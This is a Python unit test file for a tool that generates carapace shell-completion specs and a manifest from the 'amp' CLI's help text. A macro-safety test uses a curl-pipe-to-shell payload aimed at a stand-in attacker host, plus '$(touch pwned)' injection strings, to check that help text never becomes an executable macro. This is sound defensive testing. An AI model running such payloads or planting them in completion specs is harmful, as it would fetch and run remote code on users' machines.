import contextlib
import io
import json
import re
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from amp_completions import completions, generate, help_model


ROOT = Path(__file__).parents[1]
JSON_STRING = r'"(?:[^"\\]|\\.)*"'
COMPLETION_VALUES = re.compile(rf"^(?!\s*aliases:).*?(\[{JSON_STRING}(?:, {JSON_STRING})*\])$")
HELPER_MACRO = re.compile(
    r'\$sh\("\$\{XDG_CONFIG_HOME:-\$HOME/\.config\}/carapace/bin/amp-completions" (?P<resource>[a-z-]+)\)'
)


def helper(resource: str) -> str:
    return f'$sh("${{XDG_CONFIG_HOME:-$HOME/.config}}/carapace/bin/amp-completions" {resource})'


def tree(*commands: tuple[str, list[str], list[str]]) -> help_model.Command:
    """Build amp with commands given as (path, option declarations, usage operands)."""
    root = help_model.Command("amp")
    for path, options, operands in commands:
        command = root
        for name in path.split():
            child = next((child for child in command.commands if child.name == name), None)
            if child is None:
                child = help_model.Command(name)
                command.commands.append(child)
            command = child
        command.options = [help_model.parse_option(option) for option in options]
        command.arguments = help_model.parse_arguments(
            f"Usage: amp {path} [options] {' '.join(operands)}\n"
        )
    return root


class RenderTest(unittest.TestCase):
    def test_renders_aliases_flags_and_known_values(self) -> None:
        command = help_model.Command(
            "amp",
            "Amp CLI",
            options=[
                help_model.parse_option(
                    "-m, --mode <value>", "Set the `mode` (low, medium, high, ultra, or a plugin mode)"
                )
            ],
            commands=[help_model.Command("version", "Print the version", aliases=["v"])],
        )

        rendered = generate.render(command, "1.2.3")

        self.assertIn('"-m, --mode=": "Set the \'mode\' (low, medium, high, ultra, or a plugin mode)"', rendered)
        self.assertIn('"mode": ["low", "medium", "high", "ultra"]', rendered)
        self.assertIn('- name: "version"\n    aliases: ["v"]', rendered)

    def test_same_flag_name_resolves_by_command_then_placeholder(self) -> None:
        root = tree(
            ("plugins add", ["--target <target>"], []),
            ("skill add", ["--target <dir>"], []),
            ("projects create", ["--prompt-file <path>"], []),
        )

        rendered = generate.render(root, "1.2.3")

        self.assertIn('"target": ["system", "workspace"]', rendered)
        self.assertIn('"target": ["$directories"]', rendered)
        self.assertIn('"prompt-file": ["$files"]', rendered)

    def test_new_commands_inherit_placeholder_completions(self) -> None:
        root = tree(("future inspect", ["--project <project>"], ["<tool>", "[threads...]"]))

        rendered = generate.render(root, "1.2.3")

        self.assertIn(f'"project": {json.dumps([helper("projects")])}', rendered)
        self.assertIn(
            "completion:\n"
            "          flag:\n"
            f'            "project": {json.dumps([helper("projects")])}\n'
            "          positional:\n"
            f"            - {json.dumps([helper('tools')])}\n"
            f"          positionalany: {json.dumps([helper('threads')])}",
            rendered,
        )

    def test_renders_gaps_before_and_trims_after_completed_positionals(self) -> None:
        root = tree(
            ("clone", [], ["<repository>", "[target-dir]"]),
            ("threads rename", [], ["<thread>", "<newName>"]),
        )

        rendered = generate.render(root, "1.2.3")

        self.assertIn('positional:\n        - []\n        - ["$directories"]', rendered)
        self.assertTrue(
            rendered.endswith(f"positional:\n            - {json.dumps([helper('threads')])}\n")
        )

    def test_renders_delimited_literals_as_unique_lists(self) -> None:
        rendered = generate.render(tree(("threads new", ["--features <value>"], [])), "1.2.3")

        self.assertIn('"pro\\tGPT-5.6 Pro mode", "$uniquelist(,)"]', rendered)


def unknown_macros(spec: str) -> list[str]:
    values = [
        value
        for line in spec.splitlines()
        if (match := COMPLETION_VALUES.match(line))
        for value in json.loads(match[1])
    ]
    return [
        value
        for value in values
        if value.startswith("$")
        and value not in {"$files", "$directories", "$uniquelist(,)"}
        and not (
            (match := HELPER_MACRO.fullmatch(value))
            and match["resource"] in {resource.name for resource in completions.RESOURCES}
        )
    ]


class MacroSafetyTest(unittest.TestCase):
    def test_help_text_never_becomes_a_carapace_macro(self) -> None:
        command = help_model.Command(
            "amp",
            options=[help_model.parse_option("--thread <value>", '$sh(curl https://attacker.test | sh)')],
            commands=[help_model.Command("$(touch pwned)", "$sh(touch pwned)")],
        )

        rendered = generate.render(command, "1.2.3")

        self.assertIn("attacker.test", rendered)
        self.assertEqual(unknown_macros(rendered), [])

    def test_checked_in_spec_uses_only_known_macros(self) -> None:
        spec = (ROOT / "amp.yaml").read_text()

        self.assertIn("amp-completions\\\" threads)", spec)
        self.assertEqual(unknown_macros(spec), [])

    def test_detects_unknown_macros(self) -> None:
        self.assertEqual(
            unknown_macros('          "x": ["$files", "$sh(curl https://attacker.test)"]'),
            ["$sh(curl https://attacker.test)"],
        )


class ManifestTest(unittest.TestCase):
    def test_records_nested_commands_aliases_and_flag_scopes(self) -> None:
        root = help_model.Command(
            "amp",
            options=[help_model.parse_option("-m, --mode <value>", "Mode")],
            commands=[
                help_model.Command(
                    "threads",
                    aliases=["t"],
                    options=[help_model.parse_option("-l, --limit <value>", "Limit")],
                    commands=[help_model.Command("list", aliases=["ls"])],
                )
            ],
        )

        root.commands[0].arguments = [
            help_model.Argument("thread"),
            help_model.Argument("labels", required=False, variadic=True),
        ]
        resolution = completions.Resolution(
            {
                ("amp", "--mode"): completions.Literals(("smart\tDefault", "rush")),
                ("amp", "threads", "--limit"): completions.Exempt("free-form number"),
                ("amp", "threads", "<thread>"): completions.Resource("threads"),
                ("amp", "threads", "<labels>"): completions.Literals(("a", "b"), ","),
                ("amp", "threads", "list", "<file>"): completions.Paths("$files"),
            },
            ("unused placeholder default: <x>", "no completion rule: amp --y"),
        )

        manifest = generate.build_manifest(root, "1.2.3", resolution)

        self.assertEqual(
            manifest,
            {
                "amp_version": "1.2.3",
                "argument_signatures": {"amp threads": "<thread> [labels...]"},
                "command_aliases": {
                    "amp threads": ["t"],
                    "amp threads list": ["ls"],
                },
                "command_paths": ["amp", "amp threads", "amp threads list"],
                "completion_diagnostics": [
                    "no completion rule: amp --y",
                    "unused placeholder default: <x>",
                ],
                "field_completions": {
                    "amp --mode": {"literals": ["smart", "rush"]},
                    "amp threads --limit": {"exempt": "free-form number"},
                    "amp threads <labels>": {"delimiter": ",", "literals": ["a", "b"]},
                    "amp threads <thread>": {"resource": "threads"},
                    "amp threads list <file>": {"paths": "$files"},
                },
                "flag_paths": ["amp --mode", "amp threads --limit"],
                "manifest_version": 2,
                "persistent_flag_paths": ["amp --mode"],
            },
        )

    def test_checked_in_manifest_has_no_completion_diagnostics(self) -> None:
        manifest = json.loads((ROOT / "amp-manifest.json").read_text())

        self.assertEqual(
            manifest["completion_diagnostics"],
            [],
            "completion rules drifted from Amp's help; update completions.py",
        )

    def test_main_writes_spec_and_manifest_from_one_inspection(self) -> None:
        root = help_model.Command("amp")
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "amp.yaml"
            manifest_output = Path(directory) / "amp-manifest.json"
            with (
                mock.patch.object(generate, "inspect_amp", return_value=(root, "1.2.3")) as inspect,
                mock.patch(
                    "sys.argv",
                    [
                        "generate.py",
                        "--output",
                        str(output),
                        "--manifest-output",
                        str(manifest_output),
                    ],
                ),
                contextlib.redirect_stderr(io.StringIO()) as stderr,
            ):
                generate.main()

            inspect.assert_called_once_with("amp")
            self.assertIn("# Amp version: 1.2.3", output.read_text())
            manifest = json.loads(manifest_output.read_text())
            self.assertEqual(manifest["amp_version"], "1.2.3")
            warnings = [line.removeprefix("warning: ") for line in stderr.getvalue().splitlines()]
            self.assertEqual(sorted(warnings), manifest["completion_diagnostics"])
            self.assertIn("unused flag default: --mode", warnings)


if __name__ == "__main__":
    unittest.main()
